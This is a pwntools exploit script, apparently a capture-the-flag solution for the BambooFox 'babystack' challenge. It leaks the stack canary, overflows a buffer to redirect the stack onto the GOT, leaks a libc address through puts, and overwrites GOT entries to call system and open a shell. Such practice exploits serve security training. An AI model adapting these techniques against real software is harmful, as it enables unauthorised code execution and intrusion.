from pwn import *
IP = "chall.ctf.bamboofox.tw"
PORT = 10102
#r = remote(IP,PORT)
r = process("./babystack")

r.sendafter("Name: ","abcde")
r.sendafter("token: ","deadbeef")

p = b'\x00'.ljust(8,b'a')
r.sendafter("str1: \n",p)
p = 'a'
r.sendafter("str2: \n",p)
'''
res = '\x00'+r.recvline()[1:8]
print(len(res))
r.interactive()
'''
canary = u64(b'\x00'+r.recvline()[1:8])
info("Canary: "+hex(canary))

puts_got = 0x403410
puts_plt_resolve = 0x401036
strlen_plt_resolve = 0x401046
stkfail_plt_resolve = 0x401056
ret = 0x401453


rbp = puts_got+0x50
#puts 0x400626
p = b'\x00'+b'a'*15
r.sendafter("str1: \n",p)
p = b'a'*40+p64(canary)+p64(rbp)
r.sendafter("str2: \n",p)
r.recvline()

p = p64(puts_plt_resolve)+p64(strlen_plt_resolve)+p64(0x4013FD)#+p64(0x400963)#+p64(0x400827)#token
#input()
r.send(p)
#r.interactive()
#r.recvline()
libc = u64(r.recvline()[:-1].ljust(8,b'\x00'))-0x83cc0 #puts
info("Libc base: "+hex(libc))
#r.interactive()

#input()
'''
rbp = 0x403808
#puts 0x400626
p = b'\x00'+b'a'*15
r.send(p)
p = b'a'*40+p64(canary)+p64(rbp)
r.send(p)
'''
rbp = puts_got-0x10+0x50
#puts 0x400626
p = b'\x00'+b'a'*15
r.send(p)
p = b'a'*40+p64(canary)+p64(rbp)
r.send(p)

#system = libc + 0x52fd0
system = libc + 0x52B02
#r.interactive()

#p = p64(system)+"sh 1>&0\x00"
input()
p = b"sh 1>&0\x00".ljust(16,b'\x00')+p64(system)
r.send(p)

r.interactive()
